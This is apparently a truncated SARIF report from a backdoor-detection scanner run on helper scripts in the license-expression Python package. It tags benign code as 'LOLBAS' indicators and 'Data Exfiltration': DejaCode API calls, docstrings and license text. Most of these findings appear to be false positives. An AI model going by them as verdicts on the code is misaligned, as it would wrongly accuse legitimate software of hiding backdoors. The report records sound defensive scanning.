{
  "$schema": "https://schemastore.azurewebsites.net/schemas/json/sarif-2.1.0-rtm.6.json",
  "version": "2.1.0",
  "runs": [
    {
      "tool": {
        "driver": {
          "name": "oss-detect-backdoor",
          "organization": "Microsoft Corporation",
          "product": "OSSGadget (https://github.com/Microsoft/OSSGadget)",
          "version": "0.0.0+4a24249b20"
        }
      },
      "results": [
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_dejacode.py"
                },
                "region": {
                  "startLine": 90,
                  "startColumn": 3,
                  "endLine": 90,
                  "endColumn": 11,
                  "snippet": {
                    "text": "\ndef update_with_dejacode_about_data(distribution):\n    \"\"\"\n    Update the Distribution `distribution` wiht ABOUT code data fetched from\n    DejaCode. Return True if data was updated.\n    \"\"\"\n    package_data = get_package_data(distribution)\n",
                    "rendered": {
                      "text": "\ndef update_with_dejacode_about_data(distribution):\n    \"\"\"\n    Update the Distribution `distribution` wiht ABOUT code data fetched from\n    DejaCode. Return True if data was updated.\n    \"\"\"\n    package_data = get_package_data(distribution)\n",
                      "markdown": "`\ndef update_with_dejacode_about_data(distribution):\n    \"\"\"\n    Update the Distribution `distribution` wiht ABOUT code data fetched from\n    DejaCode. Return True if data was updated.\n    \"\"\"\n    package_data = get_package_data(distribution)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_dejacode.py"
                },
                "region": {
                  "startLine": 78,
                  "startColumn": 3,
                  "endLine": 78,
                  "endColumn": 11,
                  "snippet": {
                    "text": "\ndef update_with_dejacode_data(distribution):\n    \"\"\"\n    Update the Distribution `distribution` with DejaCode package data. Return\n    True if data was updated.\n    \"\"\"\n    package_data = get_package_data(distribution)\n",
                    "rendered": {
                      "text": "\ndef update_with_dejacode_data(distribution):\n    \"\"\"\n    Update the Distribution `distribution` with DejaCode package data. Return\n    True if data was updated.\n    \"\"\"\n    package_data = get_package_data(distribution)\n",
                      "markdown": "`\ndef update_with_dejacode_data(distribution):\n    \"\"\"\n    Update the Distribution `distribution` with DejaCode package data. Return\n    True if data was updated.\n    \"\"\"\n    package_data = get_package_data(distribution)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_dejacode.py"
                },
                "region": {
                  "startLine": 149,
                  "startColumn": 31,
                  "endLine": 149,
                  "endColumn": 37,
                  "snippet": {
                    "text": "        if matched:\n            return package_data\n\n    # there was no exact match, find the latest version\n    # TODO: consider the closest version rather than the latest\n    # or the version that has the best data\n    with_versions = [(packaging_version.parse(p[\"version\"]), p) for p in packages]\n",
                    "rendered": {
                      "text": "        if matched:\n            return package_data\n\n    # there was no exact match, find the latest version\n    # TODO: consider the closest version rather than the latest\n    # or the version that has the best data\n    with_versions = [(packaging_version.parse(p[\"version\"]), p) for p in packages]\n",
                      "markdown": "`        if matched:\n            return package_data\n\n    # there was no exact match, find the latest version\n    # TODO: consider the closest version rather than the latest\n    # or the version that has the best data\n    with_versions = [(packaging_version.parse(p[\"version\"]), p) for p in packages]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_dejacode.py"
                },
                "region": {
                  "startLine": 73,
                  "startColumn": 24,
                  "endLine": 73,
                  "endColumn": 30,
                  "snippet": {
                    "text": "    elif len_results > 1:\n        print(f\"More than 1 entry exists, review at: {DEJACODE_API_URL_PACKAGES}\")\n    else:\n        print(\"Could not find package:\", distribution.download_url)\n\n\ndef update_with_dejacode_data(distribution):\n",
                    "rendered": {
                      "text": "    elif len_results > 1:\n        print(f\"More than 1 entry exists, review at: {DEJACODE_API_URL_PACKAGES}\")\n    else:\n        print(\"Could not find package:\", distribution.download_url)\n\n\ndef update_with_dejacode_data(distribution):\n",
                      "markdown": "`    elif len_results > 1:\n        print(f\"More than 1 entry exists, review at: {DEJACODE_API_URL_PACKAGES}\")\n    else:\n        print(\"Could not find package:\", distribution.download_url)\n\n\ndef update_with_dejacode_data(distribution):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_dejacode.py"
                },
                "region": {
                  "startLine": 201,
                  "startColumn": 23,
                  "endLine": 201,
                  "endColumn": 29,
                  "snippet": {
                    "text": "        if value:\n            new_package_payload[field] = value\n\n    response = requests.post(\n        DEJACODE_API_URL_PACKAGES,\n        data=new_package_payload,\n        headers=DEJACODE_API_HEADERS,\n",
                    "rendered": {
                      "text": "        if value:\n            new_package_payload[field] = value\n\n    response = requests.post(\n        DEJACODE_API_URL_PACKAGES,\n        data=new_package_payload,\n        headers=DEJACODE_API_HEADERS,\n",
                      "markdown": "`        if value:\n            new_package_payload[field] = value\n\n    response = requests.post(\n        DEJACODE_API_URL_PACKAGES,\n        data=new_package_payload,\n        headers=DEJACODE_API_HEADERS,\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_dejacode.py"
                },
                "region": {
                  "startLine": 117,
                  "startColumn": 27,
                  "endLine": 117,
                  "endColumn": 32,
                  "snippet": {
                    "text": "    if package_data:\n        package_api_url = package_data[\"api_url\"]\n        about_url = f\"{package_api_url}about_files\"\n        response = requests.get(about_url, headers=DEJACODE_API_HEADERS)\n        about_zip = response.content\n        with io.BytesIO(about_zip) as zf:\n            with zipfile.ZipFile(zf) as zi:\n",
                    "rendered": {
                      "text": "    if package_data:\n        package_api_url = package_data[\"api_url\"]\n        about_url = f\"{package_api_url}about_files\"\n        response = requests.get(about_url, headers=DEJACODE_API_HEADERS)\n        about_zip = response.content\n        with io.BytesIO(about_zip) as zf:\n            with zipfile.ZipFile(zf) as zi:\n",
                      "markdown": "`    if package_data:\n        package_api_url = package_data[\"api_url\"]\n        about_url = f\"{package_api_url}about_files\"\n        response = requests.get(about_url, headers=DEJACODE_API_HEADERS)\n        about_zip = response.content\n        with io.BytesIO(about_zip) as zf:\n            with zipfile.ZipFile(zf) as zi:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_dejacode.py"
                },
                "region": {
                  "startLine": 97,
                  "startColumn": 27,
                  "endLine": 97,
                  "endColumn": 32,
                  "snippet": {
                    "text": "    if package_data:\n        package_api_url = package_data[\"api_url\"]\n        about_url = f\"{package_api_url}about\"\n        response = requests.get(about_url, headers=DEJACODE_API_HEADERS)\n        # note that this is YAML-formatted\n        about_text = response.json()[\"about_data\"]\n        about_data = saneyaml.load(about_text)\n",
                    "rendered": {
                      "text": "    if package_data:\n        package_api_url = package_data[\"api_url\"]\n        about_url = f\"{package_api_url}about\"\n        response = requests.get(about_url, headers=DEJACODE_API_HEADERS)\n        # note that this is YAML-formatted\n        about_text = response.json()[\"about_data\"]\n        about_data = saneyaml.load(about_text)\n",
                      "markdown": "`    if package_data:\n        package_api_url = package_data[\"api_url\"]\n        about_url = f\"{package_api_url}about\"\n        response = requests.get(about_url, headers=DEJACODE_API_HEADERS)\n        # note that this is YAML-formatted\n        about_text = response.json()[\"about_data\"]\n        about_data = saneyaml.load(about_text)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_dejacode.py"
                },
                "region": {
                  "startLine": 50,
                  "startColumn": 23,
                  "endLine": 50,
                  "endColumn": 28,
                  "snippet": {
                    "text": "    if not can_do_api_calls():\n        return []\n\n    response = requests.get(\n        DEJACODE_API_URL_PACKAGES,\n        params=params,\n        headers=DEJACODE_API_HEADERS,\n",
                    "rendered": {
                      "text": "    if not can_do_api_calls():\n        return []\n\n    response = requests.get(\n        DEJACODE_API_URL_PACKAGES,\n        params=params,\n        headers=DEJACODE_API_HEADERS,\n",
                      "markdown": "`    if not can_do_api_calls():\n        return []\n\n    response = requests.get(\n        DEJACODE_API_URL_PACKAGES,\n        params=params,\n        headers=DEJACODE_API_HEADERS,\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_dejacode.py"
                },
                "region": {
                  "startLine": 25,
                  "startColumn": 29,
                  "endLine": 25,
                  "endColumn": 34,
                  "snippet": {
                    "text": "\"\"\"\n\nDEJACODE_API_KEY = os.environ.get(\"DEJACODE_API_KEY\", \"\")\nDEJACODE_API_URL = os.environ.get(\"DEJACODE_API_URL\", \"\")\n\nDEJACODE_API_URL_PACKAGES = f\"{DEJACODE_API_URL}packages/\"\nDEJACODE_API_HEADERS = {\n",
                    "rendered": {
                      "text": "\"\"\"\n\nDEJACODE_API_KEY = os.environ.get(\"DEJACODE_API_KEY\", \"\")\nDEJACODE_API_URL = os.environ.get(\"DEJACODE_API_URL\", \"\")\n\nDEJACODE_API_URL_PACKAGES = f\"{DEJACODE_API_URL}packages/\"\nDEJACODE_API_HEADERS = {\n",
                      "markdown": "`\"\"\"\n\nDEJACODE_API_KEY = os.environ.get(\"DEJACODE_API_KEY\", \"\")\nDEJACODE_API_URL = os.environ.get(\"DEJACODE_API_URL\", \"\")\n\nDEJACODE_API_URL_PACKAGES = f\"{DEJACODE_API_URL}packages/\"\nDEJACODE_API_HEADERS = {\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_dejacode.py"
                },
                "region": {
                  "startLine": 24,
                  "startColumn": 29,
                  "endLine": 24,
                  "endColumn": 34,
                  "snippet": {
                    "text": "Utility to create and retrieve package and ABOUT file data from DejaCode.\n\"\"\"\n\nDEJACODE_API_KEY = os.environ.get(\"DEJACODE_API_KEY\", \"\")\nDEJACODE_API_URL = os.environ.get(\"DEJACODE_API_URL\", \"\")\n\nDEJACODE_API_URL_PACKAGES = f\"{DEJACODE_API_URL}packages/\"\n",
                    "rendered": {
                      "text": "Utility to create and retrieve package and ABOUT file data from DejaCode.\n\"\"\"\n\nDEJACODE_API_KEY = os.environ.get(\"DEJACODE_API_KEY\", \"\")\nDEJACODE_API_URL = os.environ.get(\"DEJACODE_API_URL\", \"\")\n\nDEJACODE_API_URL_PACKAGES = f\"{DEJACODE_API_URL}packages/\"\n",
                      "markdown": "`Utility to create and retrieve package and ABOUT file data from DejaCode.\n\"\"\"\n\nDEJACODE_API_KEY = os.environ.get(\"DEJACODE_API_KEY\", \"\")\nDEJACODE_API_URL = os.environ.get(\"DEJACODE_API_URL\", \"\")\n\nDEJACODE_API_URL_PACKAGES = f\"{DEJACODE_API_URL}packages/\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_dejacode.py"
                },
                "region": {
                  "startLine": 25,
                  "startColumn": 22,
                  "endLine": 25,
                  "endColumn": 33,
                  "snippet": {
                    "text": "\"\"\"\n\nDEJACODE_API_KEY = os.environ.get(\"DEJACODE_API_KEY\", \"\")\nDEJACODE_API_URL = os.environ.get(\"DEJACODE_API_URL\", \"\")\n\nDEJACODE_API_URL_PACKAGES = f\"{DEJACODE_API_URL}packages/\"\nDEJACODE_API_HEADERS = {\n",
                    "rendered": {
                      "text": "\"\"\"\n\nDEJACODE_API_KEY = os.environ.get(\"DEJACODE_API_KEY\", \"\")\nDEJACODE_API_URL = os.environ.get(\"DEJACODE_API_URL\", \"\")\n\nDEJACODE_API_URL_PACKAGES = f\"{DEJACODE_API_URL}packages/\"\nDEJACODE_API_HEADERS = {\n",
                      "markdown": "`\"\"\"\n\nDEJACODE_API_KEY = os.environ.get(\"DEJACODE_API_KEY\", \"\")\nDEJACODE_API_URL = os.environ.get(\"DEJACODE_API_URL\", \"\")\n\nDEJACODE_API_URL_PACKAGES = f\"{DEJACODE_API_URL}packages/\"\nDEJACODE_API_HEADERS = {\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_dejacode.py"
                },
                "region": {
                  "startLine": 24,
                  "startColumn": 22,
                  "endLine": 24,
                  "endColumn": 33,
                  "snippet": {
                    "text": "Utility to create and retrieve package and ABOUT file data from DejaCode.\n\"\"\"\n\nDEJACODE_API_KEY = os.environ.get(\"DEJACODE_API_KEY\", \"\")\nDEJACODE_API_URL = os.environ.get(\"DEJACODE_API_URL\", \"\")\n\nDEJACODE_API_URL_PACKAGES = f\"{DEJACODE_API_URL}packages/\"\n",
                    "rendered": {
                      "text": "Utility to create and retrieve package and ABOUT file data from DejaCode.\n\"\"\"\n\nDEJACODE_API_KEY = os.environ.get(\"DEJACODE_API_KEY\", \"\")\nDEJACODE_API_URL = os.environ.get(\"DEJACODE_API_URL\", \"\")\n\nDEJACODE_API_URL_PACKAGES = f\"{DEJACODE_API_URL}packages/\"\n",
                      "markdown": "`Utility to create and retrieve package and ABOUT file data from DejaCode.\n\"\"\"\n\nDEJACODE_API_KEY = os.environ.get(\"DEJACODE_API_KEY\", \"\")\nDEJACODE_API_URL = os.environ.get(\"DEJACODE_API_URL\", \"\")\n\nDEJACODE_API_URL_PACKAGES = f\"{DEJACODE_API_URL}packages/\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/gen_pypi_simple.py.NOTICE"
                },
                "region": {
                  "startLine": 36,
                  "startColumn": 42,
                  "endLine": 36,
                  "endColumn": 47,
                  "snippet": {
                    "text": "either expressed or implied, of David Wolever.\n\n\nOriginal code: Copyright (c) 2008-2020 The pip developers\n\nPermission is hereby granted, free of charge, to any person obtaining\na copy of this software and associated documentation files (the\n",
                    "rendered": {
                      "text": "either expressed or implied, of David Wolever.\n\n\nOriginal code: Copyright (c) 2008-2020 The pip developers\n\nPermission is hereby granted, free of charge, to any person obtaining\na copy of this software and associated documentation files (the\n",
                      "markdown": "`either expressed or implied, of David Wolever.\n\n\nOriginal code: Copyright (c) 2008-2020 The pip developers\n\nPermission is hereby granted, free of charge, to any person obtaining\na copy of this software and associated documentation files (the\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/gen_pypi_simple.py.NOTICE"
                },
                "region": {
                  "startLine": 5,
                  "startColumn": 17,
                  "endLine": 5,
                  "endColumn": 22,
                  "snippet": {
                    "text": "\nCopyright (c) nexB Inc.\nCopyright (c) 2010 David Wolever <david@wolever.net>\nCopyright (c) The pip developers\n\n\nOriginal code: copyright 2010 David Wolever <david@wolever.net>. All rights reserved.\n",
                    "rendered": {
                      "text": "\nCopyright (c) nexB Inc.\nCopyright (c) 2010 David Wolever <david@wolever.net>\nCopyright (c) The pip developers\n\n\nOriginal code: copyright 2010 David Wolever <david@wolever.net>. All rights reserved.\n",
                      "markdown": "`\nCopyright (c) nexB Inc.\nCopyright (c) 2010 David Wolever <david@wolever.net>\nCopyright (c) The pip developers\n\n\nOriginal code: copyright 2010 David Wolever <david@wolever.net>. All rights reserved.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/gen_requirements.py"
                },
                "region": {
                  "startLine": 45,
                  "startColumn": 46,
                  "endLine": 45,
                  "endColumn": 54,
                  "snippet": {
                    "text": "        type=pathlib.Path,\n        metavar=\"FILE\",\n        default=\"requirements.txt\",\n        help=\"Path to the requirements file to update or create.\",\n    )\n\n    args = parser.parse_args()\n",
                    "rendered": {
                      "text": "        type=pathlib.Path,\n        metavar=\"FILE\",\n        default=\"requirements.txt\",\n        help=\"Path to the requirements file to update or create.\",\n    )\n\n    args = parser.parse_args()\n",
                      "markdown": "`        type=pathlib.Path,\n        metavar=\"FILE\",\n        default=\"requirements.txt\",\n        help=\"Path to the requirements file to update or create.\",\n    )\n\n    args = parser.parse_args()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_thirdparty.py"
                },
                "region": {
                  "startLine": 1966,
                  "startColumn": 14,
                  "endLine": 1966,
                  "endColumn": 22,
                  "snippet": {
                    "text": "\n################################################################################\n#\n# Functions to update or fetch ABOUT and license files\n#\n################################################################################\n\n",
                    "rendered": {
                      "text": "\n################################################################################\n#\n# Functions to update or fetch ABOUT and license files\n#\n################################################################################\n\n",
                      "markdown": "`\n################################################################################\n#\n# Functions to update or fetch ABOUT and license files\n#\n################################################################################\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_thirdparty.py"
                },
                "region": {
                  "startLine": 1948,
                  "startColumn": 17,
                  "endLine": 1948,
                  "endColumn": 21,
                  "snippet": {
                    "text": "    as_text=True,\n):\n    \"\"\"\n    Fetch content at ``path_or_url`` URL or path and save this to\n    ``dest_dir/filername``. Return the fetched content. Raise an Exception on\n    errors. Treats the content as text if as_text is True otherwise as treat as\n    binary.\n",
                    "rendered": {
                      "text": "    as_text=True,\n):\n    \"\"\"\n    Fetch content at ``path_or_url`` URL or path and save this to\n    ``dest_dir/filername``. Return the fetched content. Raise an Exception on\n    errors. Treats the content as text if as_text is True otherwise as treat as\n    binary.\n",
                      "markdown": "`    as_text=True,\n):\n    \"\"\"\n    Fetch content at ``path_or_url`` URL or path and save this to\n    ``dest_dir/filername``. Return the fetched content. Raise an Exception on\n    errors. Treats the content as text if as_text is True otherwise as treat as\n    binary.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_thirdparty.py"
                },
                "region": {
                  "startLine": 1904,
                  "startColumn": 50,
                  "endLine": 1904,
                  "endColumn": 54,
                  "snippet": {
                    "text": "    _delay=0,\n):\n    \"\"\"\n    Fetch and return a tuple of (headers, content) at `url`. Return content as a\n    text string if `as_text` is True. Otherwise return the content as bytes.\n\n    If `header_only` is True, return only (headers, None). Headers is a mapping\n",
                    "rendered": {
                      "text": "    _delay=0,\n):\n    \"\"\"\n    Fetch and return a tuple of (headers, content) at `url`. Return content as a\n    text string if `as_text` is True. Otherwise return the content as bytes.\n\n    If `header_only` is True, return only (headers, None). Headers is a mapping\n",
                      "markdown": "`    _delay=0,\n):\n    \"\"\"\n    Fetch and return a tuple of (headers, content) at `url`. Return content as a\n    text string if `as_text` is True. Otherwise return the content as bytes.\n\n    If `header_only` is True, return only (headers, None). Headers is a mapping\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_thirdparty.py"
                },
                "region": {
                  "startLine": 1881,
                  "startColumn": 22,
                  "endLine": 1881,
                  "endColumn": 26,
                  "snippet": {
                    "text": "\ndef get_local_file_content(path, as_text=True):\n    \"\"\"\n    Return the content at `url` as text. Return the content as bytes is\n    `as_text` is False.\n    \"\"\"\n    if path.startswith(\"file://\"):\n",
                    "rendered": {
                      "text": "\ndef get_local_file_content(path, as_text=True):\n    \"\"\"\n    Return the content at `url` as text. Return the content as bytes is\n    `as_text` is False.\n    \"\"\"\n    if path.startswith(\"file://\"):\n",
                      "markdown": "`\ndef get_local_file_content(path, as_text=True):\n    \"\"\"\n    Return the content at `url` as text. Return the content as bytes is\n    `as_text` is False.\n    \"\"\"\n    if path.startswith(\"file://\"):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_thirdparty.py"
                },
                "region": {
                  "startLine": 1861,
                  "startColumn": 32,
                  "endLine": 1861,
                  "endColumn": 36,
                  "snippet": {
                    "text": "\ndef get_file_content(path_or_url, as_text=True):\n    \"\"\"\n    Fetch and return the content at `path_or_url` from either a local path or a\n    remote URL. Return the content as bytes is `as_text` is False.\n    \"\"\"\n    if path_or_url.startswith(\"https://\"):\n",
                    "rendered": {
                      "text": "\ndef get_file_content(path_or_url, as_text=True):\n    \"\"\"\n    Fetch and return the content at `path_or_url` from either a local path or a\n    remote URL. Return the content as bytes is `as_text` is False.\n    \"\"\"\n    if path_or_url.startswith(\"https://\"):\n",
                      "markdown": "`\ndef get_file_content(path_or_url, as_text=True):\n    \"\"\"\n    Fetch and return the content at `path_or_url` from either a local path or a\n    remote URL. Return the content as bytes is `as_text` is False.\n    \"\"\"\n    if path_or_url.startswith(\"https://\"):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_thirdparty.py"
                },
                "region": {
                  "startLine": 1788,
                  "startColumn": 44,
                  "endLine": 1788,
                  "endColumn": 48,
                  "snippet": {
                    "text": "            links.append(url)\n\n        if TRACE:\n            print(f\"Found {len(links)} links at {links_url}\")\n        _CACHE.extend(links)\n        return links\n\n",
                    "rendered": {
                      "text": "            links.append(url)\n\n        if TRACE:\n            print(f\"Found {len(links)} links at {links_url}\")\n        _CACHE.extend(links)\n        return links\n\n",
                      "markdown": "`            links.append(url)\n\n        if TRACE:\n            print(f\"Found {len(links)} links at {links_url}\")\n        _CACHE.extend(links)\n        return links\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_thirdparty.py"
                },
                "region": {
                  "startLine": 1741,
                  "startColumn": 57,
                  "endLine": 1741,
                  "endColumn": 61,
                  "snippet": {
                    "text": "\n    def find_links(self, _CACHE=[]):\n        \"\"\"\n        Return a list of link URLs found in the HTML page at `self.url`\n        \"\"\"\n        if _CACHE:\n            return _CACHE\n",
                    "rendered": {
                      "text": "\n    def find_links(self, _CACHE=[]):\n        \"\"\"\n        Return a list of link URLs found in the HTML page at `self.url`\n        \"\"\"\n        if _CACHE:\n            return _CACHE\n",
                      "markdown": "`\n    def find_links(self, _CACHE=[]):\n        \"\"\"\n        Return a list of link URLs found in the HTML page at `self.url`\n        \"\"\"\n        if _CACHE:\n            return _CACHE\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_thirdparty.py"
                },
                "region": {
                  "startLine": 1396,
                  "startColumn": 52,
                  "endLine": 1396,
                  "endColumn": 56,
                  "snippet": {
                    "text": "    @classmethod\n    def packages_from_dir(cls, directory):\n        \"\"\"\n        Yield PypiPackages built from files found in at directory path.\n        \"\"\"\n        base = os.path.abspath(directory)\n\n",
                    "rendered": {
